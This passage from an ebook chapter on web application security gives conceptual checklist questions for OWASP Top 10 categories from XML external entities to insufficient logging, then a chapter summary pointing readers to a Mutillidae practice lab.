<li><span>Any clear text protocols used to transmit data (for example, HTTP, FTP, Telnet, or SMTP)</span></li>
<li><span>Any issues with the TLS/SSL certificate</span></li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">4 – XML External Entities</h1>
                </header>
            
            <article>
                
<p><span>Old applications that still use XML/SOAP web services are the ones that are the most susceptible to this kind of attack. In fact, any application (or backend) that uses XML to execute its functions will be a victim of this kind of flaw; this attack can lead to DOS (denial of service). So, here's the list that you should keep in mind when handling XML items:</span></p>
<ul>
<li><span>Is the application using a SOAP version older than 1.2?</span></li>
<li><span>Does the application use SAML within a federated or <strong>single sign-on</strong> (<strong>SSO</strong>) environment?</span></li>
<li><span>Does the application support any XML file upload?</span></li>
<li><span>Does the application execute any of the items in the XML that can be manipulated?</span></li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">5 – Broken Access Control</h1>
                </header>
            
            <article>
                
<p><span>This attack can happen when the attacker can execute functionalities that he is not allowed to perform (for example, admin privileges). This flaw can lead to information disclosure and performing unwanted actions such as deleting, adding, or changing data. From a practical point of view, as a penetration tester, ask yourself the following questions:</span></p>
<ul>
<li><span>Can you call the back-end web services (SOAP or REST) and perform unintended actions?</span></li>
<li><span>As a normal user, can you call admin functions?</span></li>
<li><span>Does the server validate the <strong>JSON Web Tokens</strong> (<strong>JWT</strong>)?</span></li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">6 – Security Misconfiguration</h1>
                </header>
            
            <article>
                
<p class="mce-root"><span>This flaw is due to a nonsecure configuration on any of the servers (web, web service, or database). This includes the infrastructure and not only the application level configurations. As an application security expert, you need to check both the infrastructure level security and the application level as well. Let's see a few tips that can give us some ideas about this issue:</span></p>
<ul>
<li class="mce-root"><span>Are any of the production servers (web, web service, or database) missing any patches?</span></li>
<li class="mce-root"><span>Do any of the production servers (web, web service, or database) have some default non-secure settings? (For example, default credentials.)</span></li>
<li class="mce-root"><span>Are any unnecessary services enabled on any of the servers?</span></li>
<li class="mce-root"><span>Is the application using default error messages that display to users details about the stack trace?</span></li>
<li class="mce-root"><span>Are any dev environments deployed into production? (For example, test pages, test credentials, test data.)</span></li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">7 – Cross-Site Scripting (XSS)</h1>
                </header>
            
            <article>
                
<p class="mce-root"><span>You already know this one, right? Just a quick reminder: this flaw is exploited when the attacker can execute JavaScript on the browser (reflected, stored, or DOM-based).</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">8 – Insecure Deserialization</h1>
                </header>
            
            <article>
                
<p class="mce-root"><span>This one is rare and you will probably never see it in your career, but since it's there on the list, I still owe you an explanation. This attack can be executed on any system that serializes/deserializes data. This attack can be achieved when the attacker modifies the application's logic or tries to run a remote code execution if there are objects in the application that can change behavior or execute during or after deserialization.</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">9 – Using Components with Known Vulnerabilities</h1>
                </header>
            
            <article>
                
<p class="mce-root"><span>This flaw is related to unsecured or vulnerable application components  (for example, third-party libraries). In practice, always ask yourself the following questions to know if you have this type of flaw:</span></p>
<ul>
<li class="mce-root"><span>Are any unsecured libraries used in the application?</span></li>
<li class="mce-root"><span>Is any unpatched/legacy software used?</span></li>
<li class="mce-root"><span>Are any unsecured components used to support the application? (Flash, ActiveX, VBS, and so on; you get the idea.)</span></li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">10 – Insufficient Logging &amp; Monitoring</h1>
                </header>
            
            <article>
                
<p class="mce-root"><span>Insufficient logging and monitoring will allow an attacker to execute an attack without any detection. Also, insufficient logging will not allow us to prove any actions. In other words, we cannot verify the repudiation of the user action. For example, a user can buy an item with 0$ from our online store, but we have no proof that he/she did it.</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p>I hope that you understood this chapter very well! I mean it; this chapter is key to your success in understanding application security vulnerabilities. If you're hesitant about any of the preceding topics, please stop and try to review them one more time. You should already have installed Mutillidae on your lab machine and started practicing all the preceding examples. </p>
<p>The topics that we discussed in this chapter do not incorporate all web application vulnerabilities, but I covered the most important ones that you will encounter in your career. SQLi is the most dangerous one and XSS is the most popular one that you will face during Web Intrusion Tests.</p>
<p>Later, we will re-visit these vulnerabilities over and over again, and that's why you must master this chapter; if you don't, you will find the upcoming chapters difficult to understand.</p>


            </article>

            
        </section>
    </div>



  </body></html>